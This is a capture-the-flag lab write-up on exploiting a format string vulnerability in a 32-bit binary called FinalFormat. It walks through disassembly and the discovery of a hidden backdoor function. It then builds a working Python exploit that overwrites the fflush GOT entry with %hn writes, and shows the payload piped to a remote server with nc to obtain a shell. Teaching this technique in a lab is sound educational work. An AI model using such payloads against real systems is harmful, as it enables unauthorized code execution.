# Format String Attack Lab

## Extra CTF - FinalFormat

From the name of the challenge we already suspect we are facing a format string
vulnerability. But first let's check the security of the binary we are given to
get an ideia of how we might exploit it.

```sh
$ checksec program
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We can see the the stack is not executable and also there is a canary, so
a typical stack based buffer overflow like we did in previous labs is a lot
harder to pull off. But on the other hand, there is no address randomization and
also RELRO is only partial. Now, let's check if the program really is
vulnerable to a format string vulnerability as we suspect.

```sh
$ ./program
There is nothing to see here...%s
Segmentation fault
```

When we pass a "%s" to the program, we get a segmentation fault. This is
because on a format string, "%s" tries to read from the address on the top of
the stack until a null byte is found, but since this address is probably not
valid, this read fails. So, our suspicion is confirmed: we have a format string
vulnerability, now let's exploit it! Let's start by disassembling main in gdb.

```sh
$ gdb program
gdb-peda$ disass main
Dump of assembler code for function main:
    0x0804926d <+0>: endbr32 
    0x08049271 <+4>: push   ebp
    0x08049272 <+5>: mov    ebp,esp
    0x08049274 <+7>: push   ebx
    0x08049275 <+8>: sub    esp,0x40
    0x08049278 <+11>: call   0x8049170 <__x86.get_pc_thunk.bx>
    0x0804927d <+16>: add    ebx,0x2d83
    0x08049283 <+22>: mov    eax,gs:0x14
    0x08049289 <+28>: mov    DWORD PTR [ebp-0x8],eax
    0x0804928c <+31>: xor    eax,eax
    0x0804928e <+33>: lea    eax,[ebx-0x1fd8]
    0x08049294 <+39>: push   eax
    0x08049295 <+40>: call   0x80490b0 <printf@plt>
    0x0804929a <+45>: add    esp,0x4
    0x0804929d <+48>: mov    eax,DWORD PTR [ebx-0x4]
    0x080492a3 <+54>: mov    eax,DWORD PTR [eax]
    0x080492a5 <+56>: push   eax
    0x080492a6 <+57>: call   0x80490c0 <fflush@plt>
    0x080492ab <+62>: add    esp,0x4
    0x080492ae <+65>: lea    eax,[ebp-0x44]
    0x080492b1 <+68>: push   eax
    0x080492b2 <+69>: lea    eax,[ebx-0x1fb8]
    0x080492b8 <+75>: push   eax
    0x080492b9 <+76>: call   0x8049110 <__isoc99_scanf@plt>
    0x080492be <+81>: add    esp,0x8
    0x080492c1 <+84>: lea    eax,[ebx-0x1fb3]
    0x080492c7 <+90>: push   eax
    0x080492c8 <+91>: call   0x80490b0 <printf@plt>
    0x080492cd <+96>: add    esp,0x4
    0x080492d0 <+99>: lea    eax,[ebp-0x44]
    0x080492d3 <+102>: push   eax
    0x080492d4 <+103>: call   0x80490b0 <printf@plt>
    0x080492d9 <+108>: add    esp,0x4
    0x080492dc <+111>: mov    eax,DWORD PTR [ebx-0x4]
    0x080492e2 <+117>: mov    eax,DWORD PTR [eax]
    0x080492e4 <+119>: push   eax
    0x080492e5 <+120>: call   0x80490c0 <fflush@plt>
    0x080492ea <+125>: add    esp,0x4
    0x080492ed <+128>: mov    eax,0x0
    0x080492f2 <+133>: mov    edx,DWORD PTR [ebp-0x8]
    0x080492f5 <+136>: xor    edx,DWORD PTR gs:0x14
    0x080492fc <+143>: je     0x8049303 <main+150>
    0x080492fe <+145>: call   0x8049390 <__stack_chk_fail_local>
    0x08049303 <+150>: mov    ebx,DWORD PTR [ebp-0x4]
    0x08049306 <+153>: leave  
    0x08049307 <+154>: ret    
End of assembler dump.
```

So, after analizing the disassemble and the normal flow of execution, we
conclude that the program is very simple: it prints the string "There is
nothing to see here...", then calls scanf and gets up to 60 characters from
stdin, after that prints the string "You gave me this:" followed by another
printf that probably looks like this printf(buffer), where buffer is user
controlled input. So, besides this format string vulnerability, there doesn't
seem to be anything wrong with this program. We will now use objdump to try to
find any hidden variables or functions.

```sh
$ objdump -t program
(...)
08049236 g     F .text  00000037              old_backdoor
(...)
```

And sure enough, we find this wierd old_backdoor function (we know it is
a function since it is in the .text section). Let's see what is does.

```sh
$ objdump -D program
(...)
08049236 <old_backdoor>:
    8049236: f3 0f 1e fb           endbr32 
    804923a: 55                    push   %ebp
    804923b: 89 e5                 mov    %esp,%ebp
    804923d: 53                    push   %ebx
    804923e: e8 2d ff ff ff        call   8049170 <__x86.get_pc_thunk.bx>
    8049243: 81 c3 bd 2d 00 00     add    $0x2dbd,%ebx
    8049249: 8d 83 08 e0 ff ff     lea    -0x1ff8(%ebx),%eax
    804924f: 50                    push   %eax
    8049250: e8 8b fe ff ff        call   80490e0 <puts@plt>
    8049255: 83 c4 04              add    $0x4,%esp
    8049258: 8d 83 1b e0 ff ff     lea    -0x1fe5(%ebx),%eax
    804925e: 50                    push   %eax
    804925f: e8 8c fe ff ff        call   80490f0 <system@plt>
    8049264: 83 c4 04              add    $0x4,%esp
    8049267: 90                    nop
    8049268: 8b 5d fc              mov    -0x4(%ebp),%ebx
    804926b: c9                    leave  
    804926c: c3                    ret
(...)
```

This functions makes a call to system(), and judging by its name, we're
guessing it will probably spawn a shell. There are two steps to exploiting
a program with a format string vulnerability: find what to write and where to
write it. It's looks like we already found our what, let's note in down.

```python
$ cat exploit.py
#!/usr/bin/python3

# old_backdoor: 0x08049236

content = bytearray(0x0 for i in range(60))
```

This is how our exploit script is looking so far. Now for what to write: we see
that after the vulnerable printf call in main, there is a call to fflush. Since
this is a library call, the code will lookup a table where it can get the
address where it's code is. Since RELRO is only partial, this table is
overwritable. If we replace the address for the real fflush with the address
for old_backdoor, we control the flow of the program! Now lets find the fflush
address.

```sh
$ objdump -R program | grep fflush
0804c010 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

Now we know what to write and where to write, so we're ready to start building
our payload! But first let's try to get the printf stack pointer to point to
our input.

```sh
$ ./program 
There is nothing to see here...AAAA%x
You gave me this:AAAA41414141
```

We see that, after just one %x, we are already getting our output printed back
to us, now if we replace %x with %n, and supply a valid address, we can write
to it.

```python
$ cat exploit.py
#!/usr/bin/python3

# old_backdoor: 0x08049236

content = bytearray(0x0 for i in range(60))
fflush_addr = 0x0804c010
content[0:4] = (fflush_addr).to_bytes(4,byteorder='little')

s = "%x"
fmt = (s).encode('latin1')
content[4:4+len(fmt)] = fmt

with open('payload', 'wb') as f:
  f.write(content)
```

```sh
$ ./exploit.py && cat payload | ./program 
There is nothing to see here...You gave me this:804c010
```

As we can see, we manage to print back to us with "%x" the address with want to
write to. Now, for writing, we will perform 2 short writes: in the first we
write the less significant half of old_backdoor, and then the other half.

```python
$ cat ./exploit.py
#!/usr/bin/python3

# old_backdoor: 0x08049236

content = bytearray(0x0 for i in range(60))
fflush_addr = 0x0804c010
content[0:4] = "JUNK".encode('latin-1')
content[4:8] = (fflush_addr).to_bytes(4,byteorder='little')
content[8:12] = "JUNK".encode('latin-1')
content[12:16] = (fflush_addr + 2).to_bytes(4,byteorder='little')

first_write = 0x9236 - 16
second_write = 0x10804 - 0x9236
s = "%" + str(first_write) + "u%hn%" + str(second_write) + "u%hn"
fmt = (s).encode('latin1')
content[16:16+len(fmt)] = fmt

with open('payload', 'wb') as f:
  f.write(content)
```

There are just a few things that need further explaining: first, we are padding
our flush address with "JUNK", this is because the "%u"s we use "steal" the
element on the top of the stack, so we add this so that it does not steal our
address, since we want it to be used by "%hn". Also, you may notice that we
used 0x10804 as the second half of the old_backdoor address. This is a trick we
use since 0x804 is less than 0x9236, so it would have given a negative value,
which we don't want. Now let's run it!

```sh
$ ./exploit.py && cat payload | ./program
(...)
Backdoor activated
```

And we get the "Backdoor activated" message, we have successfully taken control!
Just need one last trick: although we called the old_backdoor function, we
didn't get a shell. To fix this, just need to pipe another cat:

```sh
$ ./exploit.py && (cat payload;cat) | ./program
(...)
Backdoor activated
whoami
seed
```

Success! Now just pipe it to the server instead of our local program and we get
the flag.

```sh
$ ./exploit.py && (cat payload;cat) | nc ctf-fsi.fe.up.pt 4007
(...)
cat flag.txt
flag{ **REDACTED** }
```
